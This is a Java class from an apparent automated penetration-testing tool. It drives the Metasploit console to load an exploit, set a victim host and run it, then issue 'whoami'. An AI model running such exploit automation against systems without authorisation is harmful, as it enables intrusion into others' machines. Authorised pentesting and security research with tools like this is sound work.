package PenetrationTestingAutomatized.main.java;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.util.List;

public class MetasploitExploitationTool implements ExploitationModule {
	// object for handling the subprocesses, in this case for Metasploit Console
	private ProcessBuilder process;

	public MetasploitExploitationTool() {
		this.process = new ProcessBuilder();
	}

	@Override
	public void searchAndExploit(List<String> exploitsList, InetAddress victimIP) {
		try {
			Process process = this.process.command("msfconsole").start();

			OutputStream os = process.getOutputStream();
			BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os));

			// TODO for all exploit entries
			bw.write("use " + exploitsList.get(0).toString() + "\n");

			// strip "/" char for ip
			bw.write("set RHOSTS " + victimIP.toString().replace("/", "") + "\n");

			bw.write("exploit\n");

			// user commands
			bw.write("whoami\n");

			bw.close();

			InputStream is = process.getInputStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));

			String textOut;
			while ((textOut = br.readLine()) != null) {
				System.out.println(textOut);
			}

			is.close();
			os.close();
		} catch (Exception e) {
			if (e instanceof IOException)
				System.err.println("I/O ERROR DURING EXECUTION OF THE SUBPROCESS");
			if (e instanceof InterruptedException)
				System.err.println("InterruptedException ERROR DURING EXECUTION OF THE SUBPROCESS");
			e.printStackTrace();
		}
	}

}
